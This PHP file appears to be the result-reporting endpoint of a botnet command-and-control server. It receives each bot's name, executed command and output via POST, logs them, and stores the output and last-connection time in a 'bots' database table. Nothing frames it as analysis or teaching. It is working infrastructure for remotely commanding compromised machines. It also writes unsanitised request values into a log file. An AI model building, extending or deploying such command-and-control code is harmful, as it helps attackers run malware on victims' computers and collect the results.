<?php
include "../settings/settings.php";

function writeToLog($message) {
    error_log(date('Y-m-d H:i:s') . ": " . $message . "\n", 3, '../logs/results.log');
}

// Check if the request method is POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Retrieve POST parameters
    $name = $_POST['name'] ?? null;
    $command = $_POST['command'] ?? null;
    $cmd_received = $_POST['output'] ?? null;
    $error = $_POST['error'] ?? null;

    // Log the received parameters
    writeToLog("Received parameters: name=$name, command=$command, output=$cmd_received");

    // Validate required parameters
    if ($name) {
        $current_time = date('Y-m-d H:i:s'); // Get the current timestamp

        // Determine which value to use for cmd_received
        $value_to_store = !empty($cmd_received) ? $cmd_received : $error;

        // Insert the cmd_received and timestamp into the database
        $stmt_insert = $conn->prepare("UPDATE bots SET cmd_received = ?, last_connection = ? WHERE name = ?");
        $stmt_insert->bind_param("sss", $value_to_store, $current_time, $name);

        // Execute the statement
        if ($stmt_insert->execute()) {
            $response = $stmt_insert->affected_rows > 0
                ? ['status' => 'success', 'message' => 'Data updated successfully']
                : ['status' => 'error', 'message' => 'Bot not found'];

            echo json_encode($response);
            writeToLog($response['message']);
        } else {
            echo json_encode(['status' => 'error', 'message' => 'Failed to update data']);
            writeToLog("Failed to update data for bot: $name");
        }

        // Close the insert statement
        $stmt_insert->close();
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Missing required parameters']);
        writeToLog("Missing required parameters");
    }
} else {
    echo json_encode(['status' => 'error', 'message' => 'Invalid request method']);
    writeToLog("Invalid request method");
}

// Close the connection
$conn->close();
?>
